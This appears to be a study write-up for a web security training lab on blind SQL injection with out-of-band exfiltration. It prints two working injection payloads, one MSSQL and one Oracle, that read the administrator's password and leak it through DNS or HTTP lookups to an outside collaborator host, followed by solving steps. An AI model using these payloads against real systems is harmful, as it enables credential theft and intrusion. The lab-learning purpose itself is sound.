# Lab: Blind SQL injection with out-of-band data exfiltration
- Having confirmed a way to trigger out-of-band interactions, you can then use the out-of-band channel to exfiltrate data from the vulnerable application.
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
- This input reads the password for the Administrator user
- appends a unique Collaborator subdomain, and triggers a DNS lookup
- This will result in a DNS lookup like the following, allowing you to view the captured password
```
S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net
```
- Out-of-band (OAST) techniques are an extremely powerful way to detect and exploit blind SQL injection, due to the highly likelihood of success and the ability to directly exfiltrate data within the out-of-band channel
- OAST techniques are often preferable even in situations where other techniques for blind exploitation do work.
# Lab Analysis
- lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie
- The SQL query is executed asynchronously and has no effect on the application's response.
- The database contains a different table called users, with columns called username and password
# Goal 
- exploit the blind SQL injection vulnerability to find out the password of the administrator user
- log in as the administrator user.
# Solving the Lab
- intercept and modify the request containing the TrackingId cookie
- Modify the TrackingId cookie, changing it to a payload that will leak the administrator's password in an interaction with the Collaborator server.
```
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.ziloojf0snxj7hv7f9dw0n3ah1nsbkz9.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
- Go to the Collaborator tab, and click "Poll now"
- You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The password of the administrator user should appear in the subdomain of the interaction, and you can view this within the Collaborator tab. For DNS interactions, the full domain name that was looked up is shown in the Description tab. For HTTP interactions, the full domain name is shown in the Host header in the Request to Collaborator tab
